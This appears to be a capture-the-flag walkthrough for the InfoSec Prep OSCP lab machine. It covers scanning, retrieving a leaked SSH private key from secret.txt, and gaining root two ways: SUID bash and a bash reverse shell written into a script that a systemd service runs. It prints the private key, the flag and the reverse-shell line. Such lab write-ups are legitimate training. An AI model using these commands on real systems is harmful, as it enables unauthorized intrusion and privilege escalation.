@@ -1,0 +1,222 @@
+I"K><p>This machine was created for the InfoSec Prep Discord Server <a href="https://discord.gg/RRgKaep">https://discord.gg/RRgKaep</a> as a give way for a 30d voucher to the OSCP Lab, whose objective is to get root and find the flag.txt in /root.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>I discovered the target machine on the local network with netdiscover.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/prep-oscp<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24
+ Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 7 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 402
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ <span class="nt">-----------------------------------------------------------------------------</span>
+ 192.168.179.157 00:0c:29:b9:57:e3      6     360  VMware, Inc.
+ 192.168.179.254 00:50:56:ee:43:01      1      42  VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>Then, I proceeded to perform a full TCP/UDP scan to find available ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/prep-oscp<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> <span class="nt">-p1-65535</span> 192.168.179.157 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> <span class="nt">-p1-65535</span> 192.168.179.157 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+adding 192.168.179.157/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `1-65535'</span> pps 3000
+using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
+scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
+TCP open 192.168.179.157:80  ttl 64
+TCP open 192.168.179.157:22  ttl 64
+TCP open 192.168.179.157:33060  ttl 64
+sender statistics 2395.4 pps with 196605 packets sent total
+listener statistics 390334 packets recieved 0 packets droped and 0 interface drops
+TCP open                     ssh[   22]         from 192.168.179.157  ttl 64
+TCP open                    http[   80]         from 192.168.179.157  ttl 64
+TCP open                 unknown[33060]         from 192.168.179.157  ttl 64
+adding 192.168.179.157/32 mode <span class="sb">`</span>UDPscan<span class="s1">' ports `1-65535'</span> pps 3000
+using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
+scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>I did service and OS detection, script scanning and traceroute on the target machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/prep-oscp<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p22</span>,80,33060 192.168.179.157 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: WordPress 5.4.2
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry
+|_/secret.txt
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: OSCP Voucher &amp;#8211<span class="p">;</span> Just another WordPress site
+33060/tcp open  mysqlx?
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>On the web service a wordpress CMS is running, as we saw in the enumeration of services with nmap, the robots files is available, in this I found the secret.txt file.</p>
+
+<p><img src="/assets/images/infosecpreposcp/screenshot-1.png" alt="" /></p>
+
+<p><img src="/assets/images/infosecpreposcp/screenshot-2.png" alt="" /></p>
+
+<p>This file contains a base64 string.</p>
+
+<p><img src="/assets/images/infosecpreposcp/screenshot-3.png" alt="" /></p>
+
+<p>I downloaded it and decoded it, this is an OPENSSH private key.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/prep-oscp<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.157/secret.txt | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
+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
+<span class="nv">8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A</span><span class="o">=</span>
+<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>So I saved this private key to a file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/prep-oscp<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.157/secret.txt | <span class="nb">base64</span> <span class="nt">-d</span>  <span class="o">&gt;</span> id_rsa
+</code></pre></div></div>
+
+<p>On the main page, in the following text I found the user <strong>oscp</strong>.</p>
+
+<p><img src="/assets/images/infosecpreposcp/screenshot-4.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="access-via-ssh">Access via SSH</h3>
+
+<p>Before to log in is necessary grant write and read privileges to private key file, then I logged in via ssh as the user oscp.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/prep-oscp<span class="nv">$ </span><span class="nb">chmod </span>400 id_rsa
+
+root@kali:~/prep-oscp<span class="nv">$ </span>ssh oscp@192.168.179.157 <span class="nt">-i</span> id_rsa
+Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-40-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+
+The list of available updates is more than a week old.
+To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update
+
+Last login: Sat Jul 11 16:50:11 2020 from 192.168.128.1
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>oscp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>oscp<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>oscp<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>
+</code></pre></div></div>
+
+<p>In the above output we see that the <strong>oscp</strong> user belogs to lxd group, we can exploit that to get root, but by listing the SUID binaries, I was able to detect the bash binary, this allows us to elevate our privileges in an easy way.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+...
+/usr/bin/bash
+...
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-binary">SUID Binary</h3>
+
+<p>To get root, we just need to run the bash command with the -p option.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span>/usr/bin/bash <span class="nt">-p</span>
+bash-5.0# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>oscp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>oscp<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>,1000<span class="o">(</span>oscp<span class="o">)</span>
+bash-5.0# <span class="nb">cat </span>flag.txt 
+d73b04b0e696b0945283defa3eee4538
+</code></pre></div></div>
+
+<h3 id="system-service">System Service</h3>
+
+<p>Another way to get root, as we see In the oscp’s home directory there’s an ip script that performs a couple of tasks.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">ls
+</span>ip  snap
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">cat </span>ip
+<span class="c">#!/bin/sh</span>
+<span class="nb">cp</span> /etc/issue-standard /etc/issue
+/usr/local/bin/get-ip-address <span class="o">&gt;&gt;</span> /etc/issue
+</code></pre></div></div>
+
+<p>We search the path of this script in a file, it’s in the ip-update.service file, if we run this service the script will be executed.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s1">'/home/oscp/ip'</span> /etc 2&gt;/dev/null 
+/etc/systemd/system/ip-update.service:ExecStart<span class="o">=</span>/home/oscp/ip
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">cat</span> /etc/systemd/system/ip-update.service
+<span class="o">[</span>Unit]
+<span class="nv">Description</span><span class="o">=</span>Write current ip addr to /etc/issue
+
+<span class="o">[</span>Service]
+<span class="nv">Type</span><span class="o">=</span>oneshot
+<span class="nv">RemainAfterExit</span><span class="o">=</span><span class="nb">true
+</span><span class="nv">ExecStart</span><span class="o">=</span>/home/oscp/ip
+
+<span class="o">[</span>Install]
+<span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
+</code></pre></div></div>
+
+<p>With this in mind, I did a copy of the ip file, then I saved a bash reverse shell in that file, and gave it execute permissions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">mv </span>ip ip.old
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'#!/bin/bash'</span> <span class="o">&gt;</span> ip
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span> <span class="o">&gt;&gt;</span> ip
+<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">chmod</span> +x ip
+</code></pre></div></div>
+
+<p>Then, I started a netcat listener, rebooted the machine and got root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/prep-oscp<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.157] 49772
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>758<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@oscp:/#
+</code></pre></div></div>
+:ET
